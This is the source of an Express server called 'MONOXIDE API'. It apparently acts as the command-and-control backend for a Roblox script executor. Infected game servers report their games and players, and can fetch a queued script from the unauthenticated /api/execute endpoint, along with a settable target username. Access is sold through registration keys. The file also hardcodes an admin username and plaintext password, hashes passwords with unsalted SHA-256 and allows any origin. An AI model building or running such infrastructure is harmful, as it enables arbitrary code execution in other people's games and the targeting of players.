const express = require('express');
const crypto = require('crypto');

const app = express();

// In‑memory stores
const users = {};          // username -> { passwordHash, isAdmin, usedKey }
const keys = {};           // key -> { usedBy: username or null }
const sessions = {};       // token -> username
const gamesMap = {};       // gameId -> game data (accumulated from all Roblox instances)

function hashPassword(pw) {
    return crypto.createHash('sha256').update(pw).digest('hex');
}

function generateKey() {
    return crypto.randomBytes(12).toString('hex');
}

function authenticate(req, res, next) {
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Bearer ')) {
        return res.status(401).json({ error: 'No token' });
    }
    const token = auth.slice(7);
    const username = sessions[token];
    if (!username) {
        return res.status(401).json({ error: 'Invalid token' });
    }
    req.user = { username, isAdmin: users[username]?.isAdmin || false };
    next();
}

function requireAdmin(req, res, next) {
    if (!req.user.isAdmin) {
        return res.status(403).json({ error: 'Admin only' });
    }
    next();
}

app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

app.use(express.json({ limit: '10mb' }));
app.use(express.text({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// Pre‑create admin account
const adminKey = generateKey();
users['tr0llzkidd'] = {
    passwordHash: hashPassword('jgoatman100'),
    isAdmin: true,
    usedKey: adminKey
};
keys[adminKey] = { usedBy: 'tr0llzkidd' };
console.log(`Admin key: ${adminKey}`);

let targetUsername = "";

// ========== Public endpoints ==========
app.post('/api/register', (req, res) => {
    const { username, password, key } = req.body;
    if (!username || !password || !key) {
        return res.status(400).json({ error: 'Missing fields' });
    }
    if (users[username]) {
        return res.status(400).json({ error: 'Username taken' });
    }
    const keyData = keys[key];
    if (!keyData || keyData.usedBy) {
        return res.status(400).json({ error: 'Invalid or used key' });
    }
    users[username] = {
        passwordHash: hashPassword(password),
        isAdmin: false,
        usedKey: key
    };
    keys[key].usedBy = username;
    res.json({ success: true });
});

app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    const user = users[username];
    if (!user || user.passwordHash !== hashPassword(password)) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    const token = crypto.randomBytes(20).toString('hex');
    sessions[token] = username;
    res.json({ token, isAdmin: user.isAdmin });
});

app.post('/api/logout', authenticate, (req, res) => {
    delete sessions[req.headers.authorization.slice(7)];
    res.json({ success: true });
});

// ========== Admin endpoints ==========
app.post('/api/admin/generatekey', authenticate, requireAdmin, (req, res) => {
    const newKey = generateKey();
    keys[newKey] = { usedBy: null };
    res.json({ key: newKey });
});

app.get('/api/admin/keys', authenticate, requireAdmin, (req, res) => {
    const keyList = Object.entries(keys).map(([k, v]) => ({
        key: k,
        usedBy: v.usedBy || 'unused'
    }));
    res.json(keyList);
});

// ========== Game data endpoints ==========
app.post('/api/games/update', (req, res) => {
    try {
        const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
        const incomingGames = data.games || [];
        // Update or add each game
        incomingGames.forEach(game => {
            if (game.id && parseInt(game.players) > 0) {
                gamesMap[game.id] = game; // overwrite with latest data
            }
        });
        // Optionally, remove games with 0 players (already filtered above)
        // But we keep them in map with 0 players? Better to remove if 0.
        // Actually, we only add if players > 0, so games with 0 are not added.
        // If a game had players and now has 0, we need to remove it.
        // We'll rely on the fact that if a game sends 0 players, it won't be added,
        // but old entry might linger. To clean, we could check periodically or on request.
        // For simplicity, we'll remove when we receive 0.
        // However, the incomingGames array might contain a game with 0 players.
        // We should delete from map if players == 0.
        incomingGames.forEach(game => {
            if (game.id && parseInt(game.players) === 0) {
                delete gamesMap[game.id];
            }
        });
        
        // Also update global players (sum of all game players)
        globalPlayers = Object.values(gamesMap).reduce((sum, g) => sum + (parseInt(g.players) || 0), 0);
        
        res.send('OK');
    } catch (e) {
        console.error('Error updating games:', e);
        res.status(200).send('OK');
    }
});

app.get('/api/games', (req, res) => {
    const gamesList = Object.values(gamesMap);
    res.json({
        total: gamesList.length,
        players: globalPlayers,
        games: gamesList
    });
});

app.post('/api/setuser', (req, res) => {
    targetUsername = req.body || "";
    res.send('OK');
});

app.get('/api/getuser', (req, res) => {
    res.send(targetUsername);
});

// Script executor endpoints (unchanged)
let latestScript = "";
app.post('/api/execute', (req, res) => {
    latestScript = req.body || "";
    res.send('OK');
});

app.get('/api/execute', (req, res) => {
    res.send(latestScript);
    latestScript = "";
});

app.get('/api/test', (req, res) => {
    res.json({ status: 'online', games: Object.keys(gamesMap).length, players: globalPlayers, target: targetUsername });
});

app.get('/', (req, res) => {
    res.send('MONOXIDE API Running');
});

const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`Server running on port ${port}`));
